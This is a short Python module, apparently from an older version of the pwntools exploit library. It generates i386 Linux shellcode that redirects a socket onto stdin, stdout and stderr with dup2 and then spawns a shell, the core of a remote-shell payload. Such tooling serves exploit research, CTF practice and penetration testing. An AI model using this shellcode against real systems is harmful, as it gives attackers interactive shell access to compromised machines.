from pwn import *
from sh import sh

@shellcode_reqs(arch='i386', os='linux')
def dup(sock = 'ebp'):
    """Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr."""
    return """
dup:
        setfd ebx, %s
        push byte 3
        pop ecx
.loop:
        dec ecx
        push byte SYS_dup2
        pop eax
        int 0x80
        jnz .loop
""" % str(sock)

@shellcode_reqs(arch='i386', os='linux')
def dupsh(sock = 'ebp'):
    """Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr and spawns a shell."""
    return dup(sock) + sh(False)

